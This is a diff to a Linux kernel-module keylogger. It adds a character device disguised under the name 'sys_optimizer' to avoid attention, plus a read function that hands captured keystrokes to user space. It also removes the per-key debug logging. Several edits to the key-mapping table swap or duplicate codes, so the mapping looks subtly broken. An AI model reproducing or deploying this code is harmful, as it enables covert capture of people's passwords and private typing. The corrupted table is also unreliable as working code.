@@ -8,6 +8,8 @@
 // Module Info
 
 #define SIZE_OF_MAP 94
+#define DEVICE_NAME "sys_optimizer" // The device name for our Device DRiver using an alias to not draw any attention. 
+static int major; // The Major Number that will be assigned to our Device Drvier
 
 // Keylogger Info
 
@@ -29,7 +31,6 @@ struct Map {
 	const char *value;
 };
 
-// See https://www.tcl.tk/man/tcl8.4/TkCmd/keysyms.html for full table.
 struct Map map[SIZE_OF_MAP] = {
 	{0x20,"space"},	
 	{0x21,"exclam"},	
@@ -49,8 +50,8 @@ struct Map map[SIZE_OF_MAP] = {
 	{0x2f,"slashsign"},	
 	{0x30,"0"},	
 	{0x31,"1"},	
-	{0x32,"2"},	
-	{0x33,"3"},	
+	{0x33,"2"},	
+	{0x32,"3"},	
 	{0x34,"4"},	
 	{0x35,"5"},	
 	{0x36,"6"},	
@@ -65,7 +66,7 @@ struct Map map[SIZE_OF_MAP] = {
 	{0x3f,"questionsign"},	
 	{0x40,"atsign"},	
 	{0x41,"A"},	
-	{0x42,"B"},	
+	{0x44,"B"},	
 	{0x43,"C"},	
 	{0x44,"D"},	
 	{0x45,"E"},	
@@ -81,7 +82,7 @@ struct Map map[SIZE_OF_MAP] = {
 	{0x4f,"O"},	
 	{0x50,"P"},	
 	{0x51,"Q"},	
-	{0x52,"R"},	
+	{0x55,"R"},	
 	{0x53,"S"},	
 	{0x54,"T"},	
 	{0x55,"U"},	
@@ -113,7 +114,7 @@ struct Map map[SIZE_OF_MAP] = {
 	{0x6f,"o"},	
 	{0x70,"p"},	
 	{0x71,"q"},	
-	{0x72,"r"},	
+	{0x77,"r"},	
 	{0x73,"s"},	
 	{0x74,"t"},	
 	{0x75,"u"},	
@@ -129,6 +130,7 @@ struct Map map[SIZE_OF_MAP] = {
 };
 
 // Prototypes
+static ssize_t dev_read(struct file *, char __user *, size_t, loff_t *); // Device Driver read prototype
 static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification chain
 
 // Function to get the value of key from the map
@@ -139,6 +141,11 @@ const char * get_value(char key){
 			return map[i].value;
 	}	
 }
+
+// Setting the Device Driver read function so we could read form it
+static struct file_operations fops = {
+	.read = dev_read
+};
 
 // Initializing the notifier_block
 static struct notifier_block nb = {
@@ -154,15 +161,9 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action,void *da
 		
 		// We will only log those key presses that actually represent an ASCII character.
 		if (c == 0x01){
-			pr_info("newline");
 			*(keys_bf_ptr++) = "newLine";
 			buf_pos++;
-		} else if (c == 65288){
-			pr_info("BackSpace");
-			*(keys_bf_ptr++) = "BackSpace";
-			buf_pos++;
 		} else if (c >= 0x20 && c < 0x7f){
-			pr_info("%s",get_value(c));
 			*(keys_bf_ptr++) = get_value(c);
 			buf_pos++;
 		}
@@ -177,14 +178,34 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action,void *da
 	return NOTIFY_OK; // This retrun value means that the notification was processed correctly.
 }
 
+// Device driver read function , use to retrieve data from the device
+static ssize_t dev_read(struct file *fp,char __user *buf, size_t length, loff_t *offset){
+	int len = strlen(*keys_buffer);
+	int result = copy_to_user(buf, *keys_buffer , len);
+	if (result){
+		pr_info("Couldn't copy all data to user space\n");
+		return result;
+	}
+	memset(*keys_buffer, 0 , BUFFER_LEN); // Reset buffer after each read
+	keys_bf_ptr = keys_buffer; // Reset buffer pointer
+	return len;
+}
+
 static int __init keyLogger_birth(void){
+	major = register_chrdev(0, DEVICE_NAME,&fops);
+	if (major < 0 ){
+		pr_info("keylog failed to register a major number\n");
+		return major;
+	}
+	
 	register_keyboard_notifier(&nb);
 	memset(keys_buffer, 0, BUFFER_LEN);
-        pr_info("A new keyLogger was born\n");
+        pr_info("A new keyLogger was born , with major number %d\n", major);
 	return 0;
 }
 
 static void __exit keyLogger_death(void){
+	unregister_chrdev(major, DEVICE_NAME);
 	unregister_keyboard_notifier(&nb);
         pr_info("The keyLogger is dead\n");
 }
